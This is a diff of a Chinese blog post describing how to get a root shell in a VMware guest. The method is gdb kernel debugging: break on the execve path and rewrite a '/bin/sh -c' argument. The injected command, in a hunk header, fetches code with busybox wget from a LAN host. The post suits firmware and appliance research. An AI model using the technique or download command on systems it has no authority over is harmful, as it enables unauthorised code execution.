@@ -7,8 +7,7 @@ https://wzt.ac.cn/2021/05/12/vm_shell/ 一些虚拟机获取 shell 的方法
 ### 前言
 
 在参考文章中提到一种通过虚拟机调试的方式获取虚拟机root shell。<br>
-
-不过用参考文章中的方法得到的root shell时，系统是没有完全初始化的，网络也没有起来，很不方便，于是本文在参考文章的基础上进行了一些改进。<br>
+不过用参考文章中的方法得到root shell时，系统是没有完全初始化的，网络也没有起来，很不方便，于是本文在参考文章的基础上进行了一些改进。<br>
 
 ### **如何对虚拟机进行调试**
 
@@ -24,13 +23,8 @@ debugStub.port.guest32 = "12348"
 ```
 
 目标虚拟机是64位系统，就使用debugStub.port.guest64作为gdb远程调试端口。<br>
-
 目标虚拟机是32位系统，就使用debugStub.port.guest32作为gdb远程调试端口。<br>
-
 其他虚拟机软件VirtualBox,Qemu等等应该也有类似的方法进行虚拟机调试，暂未具体研究。<br>
-
-
-
 在虚拟机的 vmx 文件中添加选项后，启动虚拟机，待虚拟机完全启动进入系统后，执行gdb命令远程附加。<br>
 
 ```
@@ -61,33 +55,21 @@ determining executable automatically.  Try using the "file" command.
 ### 获取Root Shell基本思路
 
 在系统运行时，肯定会执行system/exec类函数，底层都是调用系统内核函数。<br>
-
 不管哪个内核exec系统调用都会调用_do_execve_file_isra_45函数。<br>
-
-![image-20230621134851416](./Images/image-20230621134851416.png)
-
+![image-20230621134851416](./Images/image-20230621134851416.png)<br>
 所以我们在内核_do_execve_file_isra_45函数处下断点，断下后更改函数参数，注入我们自己的命令，即可获取Root Shell.<br>
 
 #### 一些技巧
 
 1.定位_do_execve_file_isra_45函数位置<br>
-
 a)有内核elf文件时<br>
-
 一般内核elf文件中是没有符号的，如果有符号就直接可以定位_do_execve_file_isra_45函数位置。<br>
-
 没有符号时，可以通过HOME=/字符串定位run_init_process函数，进而定位_do_execve_file_isra_45函数位置。<br>
-
-![image-20230621140554288](./Images/image-20230621140554288.png)
-
-![image-20230621140609507](./Images/image-20230621140609507.png)
-
+![image-20230621140554288](./Images/image-20230621140554288.png)<br>
+![image-20230621140609507](./Images/image-20230621140609507.png)<br>
 b)无内核elf文件时<br>
-
 暂未研究成功，先搁置。<br>
-
 2.断点技巧<br>
-
 目标是找到一个参数是/bin/sh -c xxx的调用，这样就可以直接修改xxx的值进行命令修改，可以在_do_execve_file_isra_45函数处下条件断点过滤参数。<br>
 
 ```
@@ -109,3 +91,10 @@ set {char [113]} 0x000000000066c0a0 = "cd /tmp;/bin/busybox wget http://192.168.
 继续执行即可获取一个root shell
 ```
 
+#### End
+读者有责任遵守其所在国家或地区的所有法律。<br/>
+作者不对使用本博客任何文章中提到的任何内容所造成的任何损害负责。<br/>
+本博客全部文章遵循 CC-BY-SA-4.0 协议。<br/>
+https://creativecommons.org/licenses/by-sa/4.0/<br/><br/>
+欢迎关注我的微信公众号！<br/>
+![qrcode](Images/qrcode.jpg)
